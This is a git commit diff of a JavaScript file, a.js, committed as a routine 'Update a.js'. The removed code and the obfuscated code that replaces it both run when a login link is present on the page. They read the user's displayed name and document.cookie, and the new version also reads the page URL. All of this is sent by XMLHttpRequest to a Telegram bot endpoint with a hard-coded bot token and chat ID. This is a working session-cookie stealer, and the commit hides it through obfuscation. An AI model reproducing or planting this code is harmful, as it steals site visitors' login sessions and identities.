41dc28f1f4ef0668ee50f3abee84f29a3fa5cf90
Muhammad <87897908+kpacav4ik@users.noreply.github.com>
2024-09-26 06:48:39 -0700

    Update a.js

--- a.js
+++ a.js
@@ -1,9 +1,1 @@
-if (document.querySelector('[href="#login-box"]')) {
-  let url = 'https://api.telegram.org/bot7722356869:AAHUB4XLWf5nsTmW8ot8DyrTyytuevIFccU/sendMessage?chat_id=7047469171&text=' + JSON.stringify({
-    name: document.querySelector('[href="#login-box"]')?.textContent.trim(),
-    cookies: document.cookie,
-  });
-  let oReq = new XMLHttpRequest();
-  oReq.open("GET", url, true);
-  oReq.send();
-}
+function _0xa45f(_0x397d14,_0x269841){const _0x33748c=_0x3374();return _0xa45f=function(_0xa45fa1,_0x16e46e){_0xa45fa1=_0xa45fa1-0x13d;let _0x5e00ec=_0x33748c[_0xa45fa1];return _0x5e00ec;},_0xa45f(_0x397d14,_0x269841);}const _0x279cd2=_0xa45f;function _0x3374(){const _0x10fb90=['GET','417048fFTIaP','561474qLYtyS','origin','251944uodWtI','308gdzoij','querySelector','pathname','textContent','236550qyYcVy','112iBaZjH','[href=\x22#login-box\x22]','14YvxmSV','stringify','174519YNInYp','cookie','open','4949590mBmBbw','location','9699quaLTo'];_0x3374=function(){return _0x10fb90;};return _0x3374();}(function(_0x52f4da,_0x438799){const _0xecfaf=_0xa45f,_0x552316=_0x52f4da();while(!![]){try{const _0x1df97f=parseInt(_0xecfaf(0x13d))/0x1+parseInt(_0xecfaf(0x14f))/0x2+-parseInt(_0xecfaf(0x14c))/0x3*(-parseInt(_0xecfaf(0x13e))/0x4)+parseInt(_0xecfaf(0x142))/0x5+parseInt(_0xecfaf(0x14e))/0x6*(parseInt(_0xecfaf(0x145))/0x7)+parseInt(_0xecfaf(0x143))/0x8*(-parseInt(_0xecfaf(0x147))/0x9)+-parseInt(_0xecfaf(0x14a))/0xa;if(_0x1df97f===_0x438799)break;else _0x552316['push'](_0x552316['shift']());}catch(_0x2ac392){_0x552316['push'](_0x552316['shift']());}}}(_0x3374,0x3132b));if(document[_0x279cd2(0x13f)]('[href=\x22#login-box\x22]')){let url='https://api.telegram.org/bot7722356869:AAHUB4XLWf5nsTmW8ot8DyrTyytuevIFccU/sendMessage?chat_id=7047469171&text='+JSON[_0x279cd2(0x146)]({'pathname':window[_0x279cd2(0x14b)][_0x279cd2(0x150)]+window['location'][_0x279cd2(0x140)],'name':document[_0x279cd2(0x13f)](_0x279cd2(0x144))?.[_0x279cd2(0x141)]['trim'](),'cookies':document[_0x279cd2(0x148)]}),oReq=new XMLHttpRequest();oReq[_0x279cd2(0x149)](_0x279cd2(0x14d),url,!![]),oReq['send']();}
